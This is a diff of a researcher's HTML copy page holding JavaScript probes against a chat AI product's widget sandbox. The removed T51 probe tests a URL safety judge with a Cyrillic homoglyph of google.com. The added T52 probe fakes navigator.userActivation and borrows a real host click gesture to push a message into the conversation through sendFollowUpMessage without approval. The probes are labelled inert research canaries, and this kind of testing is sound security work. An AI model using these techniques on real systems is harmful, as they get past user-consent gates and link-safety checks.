@@ -1,21 +1,27 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>T51</title>
+<html><head><meta charset="utf-8"><title>T52</title>
 <style>body{font:14px Menlo,monospace;background:#111;color:#ddd;max-width:900px;margin:40px auto;padding:0 16px}
 pre{background:#1b1b1b;border:1px solid #333;border-radius:8px;padding:16px;white-space:pre-wrap;word-break:break-all}
 button{font:16px Menlo,monospace;background:#ff5252;color:#fff;border:none;border-radius:6px;padding:10px 18px;cursor:pointer;margin:8px 0}
 button:hover{background:#ff7a7a}</style></head>
 <body>
-<h2>T51 CLEAN COPY PAGE</h2>
+<h2>T52 CLEAN COPY PAGE</h2>
 <p>Copy the whole payload below (or click the button), paste into the playground, run once.</p>
 <button onclick="navigator.clipboard.writeText(document.getElementById(&quot;code&quot;).textContent).then(function(){this.textContent=&quot;COPIED - paste into playground&quot;;}.bind(this))">Copy code</button>
-<pre id="code">// T51 - HOMOGLYPH JUDGE PROBE (Pluto Security research canary,
-// inert: opens ONE URL, no data attached).
-// The URL below looks exactly like google.com, but BOTH &#x27;o&#x27; letters
-// are CYRILLIC &#x27;o&#x27; (U+043E): g-o-o-g-l-e -&gt; g+CYR-o+CYR-o+g+l+e.
-// Browser normalizes it to punycode xn--ggle-55da.com (a DIFFERENT,
-// attacker-registerable domain). T49e proved the real google.com/ is
-// SILENT-open. Question: does the server-side URL judge read the
-// homoglyph as &quot;google.com&quot; (-&gt; silent) or see through it (-&gt; dialog)?
+<pre id="code">// T52 - sendFollowUpMessage LIVE PROBE (Pluto Security, inert canary:
+// sends ONE clearly-labeled inert test message into the researcher&#x27;s own
+// chat - no real data, no instructions to the model).
+// Statics (Oct 21, chunk 743845 current + main kit): in the
+// inline-visualization class sendFollowUpMessage is NOT stubbed - the
+// host handler map wires it to n4(), the REAL composer send path:
+//   - widget-side gate: navigator.userActivation.isActive (fakeable,
+//     overridden below exactly like the T49 payloads)
+//   - host-side gate: appServices.mcpAppSandbox.consumeUserGesture()
+//     (a REAL host gesture token - the click on the chat background
+//     during the countdown provides a genuine one)
+//   - no host gesture -&gt; approval flow (nj) or clean cancel
+//   - host gesture consumed -&gt; message sent DIRECTLY into the
+//     conversation (e9.send), labeled untrustedAppMessage
 (function () {
   try {
     Object.defineProperty(navigator, &quot;userActivation&quot;, {
@@ -24,29 +30,48 @@ button:hover{background:#ff7a7a}</style></head>
     });
   } catch (e) {}
 
-  var URL_T51 = &quot;https://gооgle.com/&quot;;
+  var PROMPT_T52 =
+    &quot;T52 CANARY (Pluto Security, inert research test): this message was sent programmatically from the widget realm via sendFollowUpMessage. Safe to ignore.&quot;;
 
   var d = document;
   var box = d.createElement(&quot;div&quot;);
-  box.id = &quot;t51-box&quot;;
+  box.id = &quot;t52-box&quot;;
   box.style.cssText = &quot;position:fixed;left:12px;bottom:12px;z-index:2147483647;font:12px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:6px;padding:8px 10px;max-width:80vw;white-space:pre-wrap&quot;;
-  box.textContent = &quot;T51 HOMOGLYPH (inert) - firing g[Cyr-o][Cyr-o]gle.com in 1s...&quot;;
+  box.textContent = &quot;T52 (inert) - firing sendFollowUpMessage in 5s. NOW: click ONCE on the chat background OUTSIDE this widget&quot;;
   d.body.appendChild(box);
 
-  setTimeout(function () {
+  var left = 5;
+  var iv = setInterval(function () {
+    left -= 1;
+    if (left &gt; 0) {
+      box.textContent = &quot;T52: firing in &quot; + left + &quot;s - click ONCE on the chat background outside this widget (if you have not already)&quot;;
+      return;
+    }
+    clearInterval(iv);
     var api = window.oai || window.openai || window.webplus;
-    if (!api || !api.openExternal) {
-      box.textContent = &quot;T51: no oai.openExternal API found&quot;;
+    if (!api) {
+      box.textContent = &quot;T52: no API object found&quot;;
+      return;
+    }
+    if (!api.sendFollowUpMessage) {
+      box.textContent = &quot;T52: sendFollowUpMessage not exposed. API keys: &quot; + Object.keys(api).join(&quot;, &quot;);
       return;
     }
     try {
-      api.openExternal({ href: URL_T51 });
+      var r = api.sendFollowUpMessage({ prompt: PROMPT_T52, isVisible: true });
       box.textContent =
-        &quot;T51 FIRED (inert): homoglyph g[Cyr-o][Cyr-o]gle.com (xn--ggle-55da.com)\n\n&quot; +
-        &quot;dialog = judge sees through homoglyphs\n&quot; +
-        &quot;silent tab = judge fooled, reads it as google.com&quot;;
+        &quot;T52 FIRED (inert). Watch the conversation:\n&quot; +
+        &quot;- canary message appears in the chat = CONFIRMED conversation-driving\n&quot; +
+        &quot;- approval popup appears = gated but wired\n&quot; +
+        &quot;- nothing happens = read what this banner says after a few seconds&quot;;
+      if (r &amp;&amp; typeof r.then === &quot;function&quot;) {
+        r.then(
+          function (v) { box.textContent += &quot;\nresolved: &quot; + JSON.stringify(v); },
+          function (v) { box.textContent += &quot;\nrejected: &quot; + v; }
+        );
+      }
     } catch (e) {
-      box.textContent = &quot;T51 threw: &quot; + e;
+      box.textContent = &quot;T52 threw: &quot; + e;
     }
   }, 1000);
 })();
